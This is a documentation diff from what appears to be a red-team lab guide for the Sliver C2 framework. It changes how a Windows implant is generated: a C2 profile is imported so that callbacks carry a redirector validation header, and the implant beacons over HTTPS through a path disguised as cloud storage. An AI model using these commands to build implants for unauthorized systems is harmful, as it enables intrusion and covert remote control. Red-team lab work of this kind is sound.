@@ -810,13 +810,19 @@ This starts a plain HTTP listener on port 443. The implant connects over HTTPS t
 
 ### Step 5.3: Generate Implant
 
-**In the Sliver console:**
+First, import the pre-built C2 profile. This profile has the `X-Request-ID` validation header baked in so every implant callback automatically passes the redirector's header check:
 
 ```text
-sliver > generate --http https://<YOUR_DOMAIN>/cloud/storage/objects/ --os windows --arch amd64 --format exe --header "X-Request-ID: <YOUR_TOKEN>" --save /tmp/implant.exe
+sliver > http-c2 import /root/redstack-c2-profile.yaml redstack
 ```
 
-Replace `<YOUR_DOMAIN>` with your `redirector_domain` value from `terraform.tfvars`. Replace `<YOUR_TOKEN>` with the `c2_header_value` from `terraform output deployment_info`. The `/cloud/storage/objects/` prefix is stripped by the redirector before forwarding to Sliver.
+Then generate the implant using that profile:
+
+```text
+sliver > generate --http https://<YOUR_DOMAIN>/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/implant.exe
+```
+
+Replace `<YOUR_DOMAIN>` with your `redirector_domain` value from `terraform.tfvars`. The `/cloud/storage/objects/` prefix is stripped by the redirector before forwarding to Sliver.
 
 **Transfer the implant to the Windows workstation:**
 
